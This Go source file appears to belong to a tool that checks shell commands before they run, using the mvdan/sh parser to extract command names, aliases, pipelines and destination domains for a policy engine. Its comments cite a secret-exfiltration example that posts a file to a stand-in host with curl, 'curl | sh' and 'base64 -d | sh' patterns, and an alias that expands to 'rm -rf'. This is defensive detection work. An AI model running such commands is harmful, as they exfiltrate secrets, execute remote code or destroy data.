package shell

import (
	"mvdan.cc/sh/v3/syntax"

	"github.com/amplify-lab/damping/core/policy"
)

// knownAliases resolves a shell alias name to the command+leading-args it
// expands to. mvdan/sh's syntax package does not expand aliases (only the
// opt-in interp interpreter does, which means actually executing —
// unacceptable for a pre-execution check), so this is an explicit lookup
// table instead, resolved in both factsFromCall (a lone command) and
// collectPipelineCommands (a pipeline stage) so the two command-name
// extraction paths stay consistent.
//
// A review found this described in the singular as a "maintained table of
// common dangerous aliases," implying real-world dotfile-framework coverage
// (thefuck's sudo-wrapper aliases, common git-alias conventions, etc.) that
// was never actually true — the table's sole entry, "nuke," is a synthetic
// fixture invented to exercise this resolution mechanism in tests (see
// features/dangerous_command.feature and this package's own test suite),
// not a real alias anyone's shell config defines. Rather than pad this list
// with more guessed-at "common" aliases that would carry the exact same
// unverified-claim risk, this comment now says plainly what the table is:
// a deliberately small, extensible demonstration of the mechanism. Genuine
// real-world dangerous-alias entries are welcome here once actually
// observed (e.g. via an incident or user report), not invented speculatively.
var knownAliases = map[string][]string{
	"nuke": {"rm", "-rf"},
}

// factsFromCall turns a single simple command into Facts. In mvdan/sh,
// CallExpr.Args[0] is the command word itself, not a separate field — Args[1:]
// are the real arguments.
func factsFromCall(c *syntax.CallExpr, raw string) (policy.Facts, bool) {
	if len(c.Args) == 0 {
		return policy.Facts{}, false
	}
	words := literalArgs(c.Args)

	command := words[0]
	if command == "" {
		// Word.Lit() returns "" for anything that isn't a plain literal —
		// e.g. "$(echo rm)" contains a CmdSubst part. A command name that
		// cannot be statically resolved is never assumed safe. See
		// features/dangerous_command.feature, "command constructed
		// dynamically via command substitution".
		command = policy.DynamicCommandPlaceholder
	}

	args := words[1:]
	if replacement, ok := knownAliases[command]; ok {
		command = replacement[0]
		args = append(append([]string{}, replacement[1:]...), args...)
	}

	target := ""
	if len(args) > 0 {
		target = args[len(args)-1]
	}

	// Domain was previously only ever populated for a pipeline
	// (collectPipelineCommands below) — a single, non-piped call like
	// `curl -d @secret https://evil.example.com` never got one at all,
	// which would have made destructive.secret_exfiltration's single-
	// command shape unable to check the destination against
	// AllowlistedEgressDomains in real usage, not just in a hand-built
	// test Facts value. Populated the same way collectPipelineCommands
	// derives it: scan each already-resolved literal arg for a URL.
	domain := ""
	for _, a := range args {
		if d := extractDomain(a); d != "" {
			domain = d
		}
	}

	return policy.Facts{
		Raw:     raw,
		Command: command,
		Args:    args,
		Target:  target,
		Domain:  domain,
	}, true
}

// factsFromPipeline flattens a chain of piped commands (mvdan/sh represents
// "a | b | c" as nested BinaryCmd nodes) into a single Facts describing the
// whole pipeline shape, so a rule like "curl | sh" or "base64 -d | sh" can
// match on pipeline structure regardless of how many stages it has.
func factsFromPipeline(c *syntax.BinaryCmd, raw string) (policy.Facts, bool) {
	var cmds []string
	var domain string
	if !collectPipelineCommands(c, &cmds, &domain) || len(cmds) == 0 {
		return policy.Facts{}, false
	}
	return policy.Facts{
		Raw:          raw,
		Command:      cmds[0],
		IsPipeline:   true,
		PipelineCmds: cmds,
		Domain:       domain,
	}, true
}

func collectPipelineCommands(cmd syntax.Command, cmds *[]string, domain *string) bool {
	switch c := cmd.(type) {
	case *syntax.CallExpr:
		if len(c.Args) == 0 {
			return false
		}
		name, ok := staticWordValue(c.Args[0])
		if !ok || name == "" {
			name = policy.DynamicCommandPlaceholder
		} else if replacement, aliased := knownAliases[name]; aliased {
			// A pipeline stage's command name is resolved through the same
			// alias table factsFromCall uses for a lone command — these were
			// two independent command-name-extraction paths, and only one of
			// them consulted knownAliases, so an alias used as a pipeline
			// stage (e.g. "nuke | sh" if "nuke" ever mapped to something
			// pipeline-relevant) would silently bypass resolution while the
			// identical alias outside a pipeline would not.
			name = replacement[0]
		}
		*cmds = append(*cmds, name)
		for _, w := range c.Args[1:] {
			if v, ok := staticWordValue(w); ok {
				if d := extractDomain(v); d != "" {
					*domain = d
				}
			}
		}
		return true
	case *syntax.BinaryCmd:
		if c.Op != syntax.Pipe && c.Op != syntax.PipeAll {
			return false
		}
		if c.X == nil || c.X.Cmd == nil || c.Y == nil || c.Y.Cmd == nil {
			return false
		}
		if !collectPipelineCommands(c.X.Cmd, cmds, domain) {
			return false
		}
		return collectPipelineCommands(c.Y.Cmd, cmds, domain)
	default:
		return false
	}
}
